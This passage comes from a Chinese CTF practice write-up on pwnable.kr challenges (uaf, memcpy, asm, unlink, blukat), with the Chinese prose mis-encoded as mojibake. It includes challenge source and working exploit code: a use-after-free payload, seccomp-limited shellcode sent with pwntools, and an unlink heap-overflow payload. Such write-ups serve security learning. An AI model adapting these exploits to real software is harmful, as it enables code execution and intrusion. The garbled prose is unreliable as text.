çš„è™šæŒ‡é’ˆäº†ï¼Œä¹‹åè½¬æ¢ä¸ºæŒ‡é’ˆå† + 8ï¼Œæ­£å¥½å°±æ˜¯è°ƒç”¨ vtable + 8 å¤„çš„å‡½æ•°å³ introduceã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è®©å®ƒæ‰§è¡Œä½äº vtable + 0 çš„ give_shellï¼Œåªéœ€è¦åœ¨è¿™å¥æ‰§è¡Œå‰è®© vtable çš„å€¼å‡å°‘ 8 å°±è¡Œäº†ã€‚ è€Œæˆ‘ä»¬å‰é¢å·²ç»è¯»åˆ°äº† vtable çš„å€¼ 0x401570ï¼Œå‡ 8 å°±æ˜¯ 0x401568ã€‚ è¯´äº†è¿™ä¹ˆå¤šï¼Œæ€ä¹ˆåˆ©ç”¨ useã€after å’Œ free ä¸‰ä¸ªè¿‡ç¨‹æ¥ä¿®æ”¹ vtable å€¼å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œå¯¹äºä¸€å— free æ“ä½œé‡Šæ”¾æ‰çš„å†…å­˜ï¼Œä»ç„¶å¯èƒ½å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæ˜¯æŒ‡å‘å®ƒçš„ï¼Œè¿™ä¸ªæŒ‡é’ˆä¸€èˆ¬è¢«ç§°ä½œæ‚¬ç©ºæŒ‡é’ˆ dangling pointerã€‚åœ¨è¿™é‡Œï¼Œm å’Œ w å°±å±äºæ‚¬ç©ºæŒ‡é’ˆã€‚ å¦‚æœåœ¨è¿™æ—¶ï¼Œæˆ‘ä»¬è°ƒç”¨ after è¿‡ç¨‹ï¼Œå³åˆ†é…ä¸€ä¸ªç­‰é•¿çš„å†…å­˜åŒºåŸŸç»™ dataï¼Œé‚£ä¹ˆ w æ‰€æŒ‡çš„å†…å­˜åŒºåŸŸå°±ä¼šè¢«åˆ†é…ã€‚å¦‚æœå†æ¬¡ afterï¼Œé‚£ä¹ˆ m æ‰€æŒ‡çš„å†…å­˜åŒºåŸŸä¹Ÿä¼šè¢«åˆ†é…ï¼Œè¿™æ˜¯ç”± new/malloc çš„æ€§è´¨å†³å®šçš„ã€‚ ç°åœ¨ï¼Œå‡å¦‚æˆ‘ä»¬ç»™ data å†™å…¥çš„æ˜¯ 0x401568ï¼Œå¹¶ä¸”è°ƒç”¨ use è¿‡ç¨‹ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œ m-\u003eintroduce()ï¼Œè¿™ä¼šè®¿é—®åˆ° 0x401568 + 8 = 0x401570 å¤„çš„å‡½æ•°æŒ‡é’ˆï¼Œæ°å¥½æ˜¯ m çš„ vtable + 0 å¤„ï¼Œä¹Ÿå°±å˜æˆäº† m-\u003egive_shell()ã€‚ é‚£ä¹ˆåªå‰©ä¸‹ä¸€ä¸ªé—®é¢˜äº†ï¼Œå°±æ˜¯æˆ‘ä»¬è¦åˆ†é…å¤šå¤§çš„ç©ºé—´ç»™ dataï¼Œè¿™åœ¨ IDA ä¸­å¾ˆå®¹æ˜“å‘ç°ï¼š å›¾ 3 \" å›¾ 3 0x18 å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ 24 å­—èŠ‚ã€‚æœ€ç»ˆ payloadï¼ˆæ³¨æ„åœ°å€æ˜¯ä¸‰åäºŒä½çš„ï¼‰ï¼š $ python -c 'print\"\\x68\\x15\\x40\"+\"\\x00\"*5' \u003e /tmp/payload $ ./uaf 24 /tmp/payload 1. use 2. after 3. free 3 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 1 ","date":"2019-10-09","objectID":"/pwnkr-toddler/:16:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"memcpy // compiled with : gcc -o memcpy memcpy.c -m32 -lm #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e#include \u003csignal.h\u003e#include \u003cunistd.h\u003e#include \u003csys/mman.h\u003e#include \u003cmath.h\u003e unsigned long long rdtsc(){ asm(\"rdtsc\"); } char* slow_memcpy(char* dest, const char* src, size_t len){ int i; for (i=0; i\u003clen; i++) { dest[i] = src[i]; } return dest; } char* fast_memcpy(char* dest, const char* src, size_t len){ size_t i; // 64-byte block fast copy if(len\u003e= 64){ i = len / 64; len \u0026= (64-1); while(i--\u003e 0){ __asm__ __volatile__ ( \"movdqa (%0), %%xmm0\\n\" \"movdqa 16(%0), %%xmm1\\n\" \"movdqa 32(%0), %%xmm2\\n\" \"movdqa 48(%0), %%xmm3\\n\" \"movntps %%xmm0, (%1)\\n\" \"movntps %%xmm1, 16(%1)\\n\" \"movntps %%xmm2, 32(%1)\\n\" \"movntps %%xmm3, 48(%1)\\n\" ::\"r\"(src),\"r\"(dest):\"memory\"); dest += 64; src += 64; } } // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest; } int main(void){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(\"Hey, I have a boring assignment for CS class.. :(\\n\"); printf(\"The assignment is simple.\\n\"); printf(\"-----------------------------------------------------\\n\"); printf(\"- What is the best implementation of memcpy? -\\n\"); printf(\"- 1. implement your own slow/fast version of memcpy -\\n\"); printf(\"- 2. compare them with various size of data -\\n\"); printf(\"- 3. conclude your experiment and submit report -\\n\"); printf(\"-----------------------------------------------------\\n\"); printf(\"This time, just help me out with my experiment and get flag\\n\"); printf(\"No fancy hacking, I promise :D\\n\"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e\u003c14; e++){ // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(\"specify the memcpy amount between %d ~ %d :\", low, high); scanf(\"%d\", \u0026size); if(size \u003c low || size\u003e high ){ printf(\"don't mess with the experiment.\\n\"); exit(0); } sizes[i++] = size; } sleep(1); printf(\"ok, lets run the experiment with your configuration\\n\"); sleep(1); // run experiment for(i=0; i\u003c10; i++){ size = sizes[i]; printf(\"experiment %d : memcpy with buffer size %d\\n\", i+1, size); dest = malloc(size); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(\"ellapsed CPU cycles for slow_memcpy : %llu\\n\", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(\"ellapsed CPU cycles for fast_memcpy : %llu\\n\", t2-t1); printf(\"\\n\"); } printf(\"thanks for helping my experiment!\\n\"); printf(\"flag : ----- erased in this source code -----\\n\"); return 0; } æœ¬é¢˜å®ç°äº†ä¸€ä¸ªé’ˆå¯¹ 64 å­—èŠ‚ä»¥ä¸Šçš„å—çš„å¿«é€Ÿ memcpy æ–¹æ³•ï¼Œä½¿ç”¨çš„æ˜¯ movdqa å’Œ movntps ä¸¤ä¸ªæ±‡ç¼–æŒ‡ä»¤ã€‚ä½†æ˜¯å®é™…è¿è¡Œæ—¶ï¼Œå³ä½¿æŒ‰è¦æ±‚è¾“å…¥åˆæ³•æ•°æ®ï¼Œç¨‹åºä¹Ÿä¼šå´©æºƒã€‚æŸ¥äº† ä¸€äº›èµ„æ–™ åï¼Œå‘ç°æ˜¯ç”±äºå †åˆ†é…æ—¶å­—èŠ‚æ²¡æœ‰å¯¹é½å¯¼è‡´çš„ï¼š The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated. æ˜¾ç„¶è¿™é‡Œæ˜¯è¦æ±‚ç›®çš„åœ°å€æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ï¼Œæ¢å¥è¯è¯´å®ƒçš„åå…­è¿›åˆ¶æœ«å°¾æ˜¯ 0ã€‚gdb è°ƒè¯•ä¸€ä¸‹ï¼Œå…¨éƒ¨è¾“å…¥æœ€å°çš„åˆæ³•æ•°æ®ï¼š å›¾ 4 \" å›¾ 4 å¯ä»¥çœ‹åˆ°æ®µé”™è¯¯çš„æ—¶å€™ï¼Œç›®çš„å¯„å­˜å™¨ edx çš„æœ«å°¾å¹¶ä¸æ˜¯ 0ï¼Œå› æ­¤äº§ç”Ÿäº†é”™è¯¯ã€‚è¿™ä¸éš¾ç†è§£ï¼šmalloc è¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¯¹äº 8 è€Œè¨€åˆ†é…äº† 0x8+0x8=0x10 å­—èŠ‚ï¼Œæ˜¯å¯¹é½çš„ï¼›å¯¹ 16 è€Œè¨€åˆ†é…äº† 0x8+0x10=0x18 å­—èŠ‚ï¼Œäºæ˜¯ä¸å¯¹é½äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å®ƒ + 8 æ¥å¯¹é½ã€‚å¯¹äº 32ï¼Œåˆ†é… 0x8+0x20=0x28 å­—èŠ‚ï¼ŒåŒæ ·ä¸å¯¹é½ï¼Œæˆ‘ä»¬ä¹Ÿä½œåŒæ ·çš„ padding å¤„ç†ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥æ•°æ®ï¼š 8 24 40 72 136 264 520 1032 2056 4104 ä½¿å¾—æ¯æ¬¡ edx éƒ½æ˜¯å¯¹é½çš„ï¼Œç¨‹åºå°±ä¸ä¼šæ®µé”™è¯¯äº†ï¼Œæœ€ç»ˆå¾—åˆ° flagã€‚ ","date":"2019-10-09","objectID":"/pwnkr-toddler/:17:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"asm #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/mman.h\u003e#include \u003cseccomp.h\u003e#include \u003csys/prctl.h\u003e#include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e #define LENGTH 128 void sandbox(){ scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) { printf(\"seccomp error\\n\"); exit(0); } seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) \u003c0){ seccomp_release(ctx); printf(\"seccomp error\\n\"); exit(0); } seccomp_release(ctx); } char stub[] =\"\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\"; unsigned char filter[256]; int main(int argc, char* argv[]){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(\"Welcome to shellcoding practice challenge.\\n\"); printf(\"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n\"); printf(\"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n\"); printf(\"If this does not challenge you. you should play'asg'challenge :)\\n\"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf(\"give me your x64 shellcode:\"); read(0, sh+offset, 1000); alarm(10); chroot(\"/home/asm_pwn\"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0; } ç¨‹åºé€šè¿‡ sandbox å‡½æ•°å’Œ chroot ç¦æ­¢æˆ‘ä»¬ä½¿ç”¨ç¬¦å·é“¾æ¥å’Œé™¤äº† open, read, write ä¹‹å¤–çš„å‡½æ•°ï¼ŒåŒæ—¶é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ª readmeï¼š once you connect to port 9026, the \"asm\" binary will be executed under asm_pwn privilege. make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory) flag çš„æ–‡ä»¶åæ˜¯ä¸€ä¸ªå·²çŸ¥çš„éå¸¸é•¿çš„å­—ç¬¦ä¸²ã€‚ æ ¹æ®æç¤ºï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬éœ€è¦å†™ä¸€æ®µ shellcodeï¼Œå¹¶é€šè¿‡æœ€åçš„ ((void (*)(void))sh)(); æ‰§è¡Œã€‚åœ¨æ‰§è¡Œå‰ï¼Œç¨‹åºè¿˜ä¼šæ‰§è¡Œä¸€æ®µæ±‡ç¼–ä»£ç ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„ stub æ•°ç»„ä¸­çš„å†…å®¹ï¼Œåˆ©ç”¨ pwntools çš„ disasm å·¥å…·å¾—åˆ°æ±‡ç¼–ä»£ç ï¼š 0: 48 dec eax 1: 31 c0 xor eax,eax 3: 48 dec eax 4: 31 db xor ebx,ebx 6: 48 dec eax 7: 31 c9 xor ecx,ecx 9: 48 dec eax a: 31 d2 xor edx,edx c: 48 dec eax d: 31 f6 xor esi,esi f: 48 dec eax 10: 31 ff xor edi,edi 12: 48 dec eax 13: 31 ed xor ebp,ebp 15: 4d dec ebp 16: 31 c0 xor eax,eax 18: 4d dec ebp 19: 31 c9 xor ecx,ecx 1b: 4d dec ebp 1c: 31 d2 xor edx,edx 1e: 4d dec ebp 1f: 31 db xor ebx,ebx 21: 4d dec ebp 22: 31 e4 xor esp,esp 24: 4d dec ebp 25: 31 ed xor ebp,ebp 27: 4d dec ebp 28: 31 f6 xor esi,esi 2a: 4d dec ebp 2b: 31 ff xor edi,edi è¿™é‡ŒæŠŠæ‰€æœ‰å¯„å­˜å™¨éƒ½æ¸…é›¶äº†ï¼Œè¿™æ ·å®é™…ä¸Šæ›´æ–¹ä¾¿æˆ‘ä»¬å†™ shellcodeã€‚ è€ƒè™‘å¦‚ä½•ç”¨ç³»ç»Ÿè°ƒç”¨è¯»å–æ–‡ä»¶å¹¶æ˜¾ç¤ºå‡ºæ¥ï¼š fd = open(filepath, O_RDONLY); read(fd, buf, 100); write(1, buf, 100); // stdout ç„¶åæˆ‘ä»¬åˆ©ç”¨ pwntools çš„ shellcraft æ¨¡å—ï¼Œå°†ä¸Šé¢çš„ä»£ç è½¬åŒ–æˆæ±‡ç¼–å³å¯ã€‚æˆ‘ä»¬è¦å–å¾— fd ä¹Ÿå°±æ˜¯ open çš„è¿”å›å€¼ï¼Œæ˜¾ç„¶åœ¨ rax é‡Œï¼›ç„¶åä» rax ä¸­è¯»å– flag å†…å®¹ï¼Œæ”¾åˆ°æ ˆä¸Šï¼Œä¹Ÿå°±æ˜¯ rsp ä¸Šï¼š from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = remote('pwnable.kr', 9026) shellcode = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0) shellcode += shellcraft.read('rax', 'rsp', 100) shellcode += shellcraft.write(1,'rsp', 100) p.recvuntil('shellcode:') p.sendline(asm(shellcode)) p.interactive() ","date":"2019-10-09","objectID":"/pwnkr-toddler/:18:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"unlink #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003etypedef struct tagOBJ{ struct tagOBJ* fd; struct tagOBJ* bk; char buf[8]; }OBJ; void shell(){ system(\"/bin/sh\"); } void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P-\u003ebk; FD=P-\u003efd; FD-\u003ebk=BK; BK-\u003efd=FD; } int main(int argc, char* argv[]){ malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A \u003c-\u003e B \u003c-\u003e C A-\u003efd = B; B-\u003ebk = A; B-\u003efd = C; C-\u003ebk = B; printf(\"here is stack address leak: %p\\n\", \u0026A); printf(\"here is heap address leak: %p\\n\", A); printf(\"now that you have leaks, get shell!\\n\"); // heap overflow! gets(A-\u003ebuf); // exploit this unlink! unlink(B); return 0; } é¢˜ç›®æä¾›äº†æŒ‡é’ˆ A åœ¨æ ˆä¸Šçš„åœ°å€å’Œå…¶æ‰€æŒ‡å¯¹è±¡åœ¨å †ä¸Šçš„åœ°å€ï¼Œéšåå‡ºç°äº†ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œæ˜¾ç„¶æ˜¯è¦æˆ‘ä»¬æº¢å‡º A çš„ buf å»è¦†ç›– B çš„å†…å®¹ï¼Œç„¶å unlink(B)ã€‚ unlink å‡½æ•°çš„åŸç†å’ŒåŒå‘é“¾è¡¨ä¸­åˆ é™¤ç»“ç‚¹æ˜¯ä¸€æ ·çš„ï¼Œä¸è§„èŒƒåœ°ç¼©å†™ä¸€ä¸‹ï¼š [P-\u003efd]-\u003ebk = P-\u003ebk [P-\u003ebk]-\u003efd = P-\u003efd ç„¶è€Œï¼Œå°½ç®¡ P-\u003efd-\u003ebk å’Œ P-\u003ebk-\u003efd ä¼šè¢«æ£€æŸ¥åˆæ³•æ€§ï¼Œè¿™ä¸¤å¥èµ‹å€¼è¯­å¥ä¸­çš„ P-\u003efd å’Œ P-\u003ebk éƒ½ä¸ä¼šè¢«æ£€æŸ¥ï¼Œæ¢å¥è¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªç‰¹æ€§ä½¿å³è¾¹çš„åœ°å€è¦†ç›–æ‰å·¦è¾¹åœ°å€ã€‚ å†ç®€å•ä¸€ç‚¹ï¼Œæ³¨æ„åˆ° -\u003efd ç­‰äº +0x0ï¼Œ-\u003ebk ç­‰äº +0x4ï¼Œä¹Ÿå°±æ˜¯ï¼š [P]+0x4 = P+0x4 [P+0x4] = P ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ main è¿”å›åœ°å€ï¼šret_addr = shell_addrï¼Œä¹Ÿå°±æ˜¯ä»¤ P-\u003efd=ebp, P-\u003ebk=shell_addrï¼ˆæ³¨æ„åˆ° [P-\u003efd]-\u003ebk=ebp+4ï¼‰ã€‚ç„¶è€Œï¼Œå½“æ‰§è¡Œä¸‹ä¸€å¥æ—¶ï¼Œæœ‰ [P-\u003ebk]-\u003efd=*(shell_addr)=shell()ï¼Œä¼šè¢« P-\u003efd ä¹Ÿå°±æ˜¯ ebp è¦†ç›–æ‰ï¼Œå¯¼è‡´æˆ‘ä»¬çš„ shell() å‡½æ•°è¢«ä¿®æ”¹ã€‚åä¹‹åŒç†ã€‚ æˆ–è€…ï¼Œæˆ‘ä»¬å¯ä»¥å¾€æ ˆä¸Šå†™ shell() æˆ–è€… GOT åŠ«æŒï¼Œç”±äº NX ä¿æŠ¤å’Œåº“å‡½æ•°ç¼ºå¤±ï¼Œè¿™é‡Œä¹Ÿä¸èƒ½ç”¨ã€‚ æœ€åï¼Œæˆ‘ä»¬å…ˆæ‰¾åˆ°äº† shell() åœ°å€ 0x80484ebï¼Œéšååœ¨æ±‡ç¼–ä¸­å‘ç°å…³é”®ä»£ç ï¼š mov ecx, [ebp-0x4] leave lea esp, [ecx-0x4] retn è¿™é‡Œçš„ä»£ç é€»è¾‘å¾ˆå¥‡æ€ªï¼šleave å·²ç»æ¢å¤ esp äº†ï¼Œä¸‹ä¸€å¥åˆæ”¹å˜äº† esp çš„å€¼ã€‚æ¢ä¸ªå†™æ³•ï¼š ecx = [ebp-0x4] esp = ecx-0x4 eip = esp è¿™æ ·å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å½±å“ esp æ¥å½±å“è¿”å›åœ°å€ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬æ§åˆ¶ ecxã€‚æ§åˆ¶ ecxï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶ [ebp-0x4]ã€‚ é‚£æˆ‘ä»¬æœ€ç»ˆè‚¯å®šæ˜¯è¦è®© esp = shell_addrï¼Œä¸ºäº†äº§ç”Ÿè¿™ä¸ª shell_addrï¼Œé¦–å…ˆè¦æŠŠ shell() å†™å…¥å †ä¸Šçš„æŸä¸ªå®‰å…¨ï¼ˆä¸ä¼šè¢«ä¿®æ”¹ï¼‰çš„åœ°æ–¹ï¼Œæ˜¾ç„¶ A-\u003ebuf å¼€å¤´æ˜¯éå¸¸ç†æƒ³çš„ä½ç½®ã€‚ æ­¤æ—¶æœ‰ shell_addr = A+0x8ï¼ˆä¸¤ä¸ªæŒ‡é’ˆ 8 å­—èŠ‚ï¼‰ï¼Œé‚£å°±è¦è®© esp = ecx-0x4 = A+0x8ï¼Œå¾— ecx = A+0xcã€‚ è¿™éœ€è¦ [ebp-0x4] = A+0xcï¼Œè¿™å°±åˆ°äº† unlink å‡ºåœºçš„æ—¶å€™äº†ã€‚æˆ‘ä»¬è®¾ç½® B-\u003ebk ä¸º ebp-0x4ï¼ŒB-\u003efd ä¸º A+0xcï¼ŒæŒ‰ç…§å‰é¢è¯´çš„åŸç†å°±èƒ½å®ç°è¦†ç›–ï¼ˆæ³¨ï¼šæ­¤æ—¶ A-\u003ebuf[4:8] è¢«ä¿®æ”¹ï¼Œè¿™ä¸ä¼šæœ‰å½±å“ï¼‰ï¼Œæ­¤æ—¶å †é•¿è¿™æ ·ï¼ˆæ¯å— 4 å­—èŠ‚ï¼‰ï¼š --------- | A-\u003efd | --------- | A-\u003ebk | --------- | shell() | // A-\u003ebuf[0:4] --------- | | // A-\u003ebuf[4:8] --------- | A+0xc | // B-\u003efd --------- | ebp-0x4 | // B-\u003ebk --------- | B-\u003ebuf | ... é—®é¢˜æ¥äº†ï¼š ä¸Šé¢çš„ A æ˜¯ A çš„æ ˆåœ°å€è¿˜æ˜¯ A æ‰€æŒ‡å¯¹è±¡çš„å †åœ°å€ï¼Ÿ å¦‚ä½•å¾—åˆ° ebp-0x4ï¼Ÿ ç¬¬ä¸€ä¸ªé—®é¢˜å¾ˆå®¹æ˜“ï¼Œæˆ‘ä»¬æœ€ç»ˆéœ€è¦è·å–çš„å†…å®¹æ˜¯ shell()ï¼Œè¿™ä¸ªä¸œè¥¿è¢«æˆ‘ä»¬æ”¾åœ¨äº† A æ‰€æŒ‡çš„ OBJ å¯¹è±¡é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ‹¿ A+0x8 å¾ˆæ˜æ˜¾æ˜¯æŒ‡ A çš„å †åœ°å€ï¼Œä¹Ÿå°±æ˜¯ heap address leakã€‚ ç¬¬äºŒä¸ªé—®é¢˜ï¼Œé¢˜ç›®ç»™çš„ stack_leak æˆ‘ä»¬ä¼¼ä¹è¿˜æ²¡æœ‰ç”¨ï¼Œæ€ä¹ˆç”¨å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬éœ€è¦ç”¨ A åœ¨æ ˆä¸Šçš„åœ°å€æ‰¾åˆ° ebp-0x4 çš„å€¼ï¼Œæ‰€ä»¥è®¡ç®—ä¸€ä¸‹ä¸¤è€…çš„åç§»é‡å³å¯ã€‚åœ¨æ±‡ç¼–ä»£ç ä¸­å¯ä»¥æ‰¾åˆ° A,B,C åˆ†åˆ«ä½äº ebp-0x14, ebp-0xc, ebp-0x10 çš„ä½ç½®ï¼Œé‚£å°±å¯ä»¥æ¨å‡º ebp-0x4 = (ebp-0x14) + 0x10 = stack address leak + 0x10ã€‚ æœ€ç»ˆ payloadï¼š from pwn import * p = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest').process('./unlink') p.recvuntil('stack address leak:') stack_leak = int(p.recv(10), 16) p.recvuntil('heap address leak:') heap_leak = int(p.recv(9), 16) shell_addr = 0x80484eb payload = p32(shell_addr) + 'a'*12 + p32(heap_leak+0xc) + p32(stack_leak+0x10) p.send(payload) p.interactive() æ­¤å¤–ï¼Œæˆ‘ä»¬åˆšæ‰ä»…ä»…åˆ©ç”¨äº†ç¬¬äºŒå¥è¯ [P-\u003ebk]-\u003efd = P-\u003efdï¼Œå¦ä¸€å¥è¯å¹¶æ²¡æœ‰ç”¨ã€‚é‚£èƒ½ä¸èƒ½åªç”¨å¦ä¸€å¥è¯ [P-\u003efd]-\u003ebk = P-\u003ebk æ¥å®Œæˆè¿™é¢˜å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚å®é™…ä¸Šï¼ŒåŒºåˆ«å¾ˆå¾®å¦™ã€‚ è¿™é‡Œä¸åŒäºåˆšæ‰æ§åˆ¶ [ebp-0x4] ä¿®æ”¹ ecx çš„æ€è·¯ï¼Œè€Œæ˜¯ç›´æ¥æƒ³åŠæ³•ä¿®æ”¹ ebp å¼•èµ· ecx å˜åŒ–ï¼Œç›®æ ‡è¿˜æ˜¯è®© [ebp-0x4]=A+0xcã€‚ ä»¤ P-\u003efd = ebp-0x8ï¼ŒP-\u003ebk = A+0xcï¼Œåˆ™æˆ‘ä»¬ä¼šå‘ç° [P-\u003efd]-\u003ebk æŒ‡å‘ ecxï¼Œæ­¤æ—¶æˆ‘ä»¬åˆèƒ½ç”¨ A+0xc è¦†ç›– ecx äº†ï¼ --------- | ebp-0x8 | // B-\u003efd --------- | A+0xc | // B-\u003ebk --------- æ ¹æ®åˆšæ‰å¾—åˆ°çš„æ ˆä¸Šå…³ç³»ï¼Œebp-0x8 = stack address leak + 0xcï¼Œå› æ­¤ç¬¬äºŒç§æ–¹æ³•çš„ payloadï¼š payload = p32(shell_addr) + 'a'*12 + p32(stack_leak+0xc) + p32(heap_leak+0xc) ","date":"2019-10-09","objectID":"/pwnkr-toddler/:19:0","tags":["Linux","C/C++","ARM","æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","å †æ¼æ´"],"title":"Pwnable.kr Toddler's Bottle ç»ƒä¹ è®°å½•","uri":"/pwnkr-toddler/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"blukat è¿™é¢˜åªæœ‰ä¸‰åˆ†ï¼Œä½†æ˜¯ä»£ç ä¸­å¹¶æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„ç‚¹ï¼š #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e#include \u003cfcntl.h\u003echar flag[100]; char password[100]; char* key = \"3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+\"; void calc_flag(char* s){ int i; for(i=0; i\u003cstrlen(s); i++){ flag[i] = s[i] ^ key[i]; } printf(\"%s\\n\", flag); } int main(){ FILE* fp = fopen(\"/home/blukat/password\", \"r\"); fgets(password, 100, fp); char buf[100]; printf(\"guess the password!\\n\"); fgets(buf, 128, stdin); if(!strcmp(password, buf)){ printf(\"congrats! here is your flag:\"); calc_flag(password); } else{ printf(\"wrong guess!\\n\"); exit(0); } return 0; } è¿™é‡Œå°±æ˜¯è¦æ±‚è¾“å…¥ password å¹¶å’ŒåŒç›®å½•çš„ password æ–‡ä»¶æ¯”å¯¹ï¼Œç›¸åŒåˆ™è¾“å‡º flagã€‚ç›´æ¥ cat passwordï¼Œæ˜¾ç¤ºæ— æƒé™ï¼š cat: password: Permission denied ç”±äºæ²¡æœ‰å¯åˆ©ç”¨çš„ç‚¹å¹¶ä¸”åˆ†å¾ˆä½ï¼Œç»“åˆæç¤ºå¯ä»¥æƒ³åˆ°ä¸æ˜¯å¸¸è§„æ€è·¯èƒ½è§£å†³çš„é¢˜ã€‚æ³¨æ„åˆ° blukat.c è¿™ä¸ªç¨‹åºæ˜æ˜¾æ˜¯å¯ä»¥è¯» password æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶çš„æƒé™ï¼š $ ls -al total 36 drwxr-x--- 4 root blukat 4096 Aug 16 2018 . drwxr-xr-x 114 root root 4096 May 19 15:59 .. -r-xr-sr-x 1 root blukat_pwn 9144 Aug 8 2018 blukat -rw-r--r-- 1 root root 645 Aug 8 2018 blukat.c dr-xr-xr-x 2 root root 4096 Aug 16 2018 .irssi -rw-r----- 1 root blukat_pwn 33 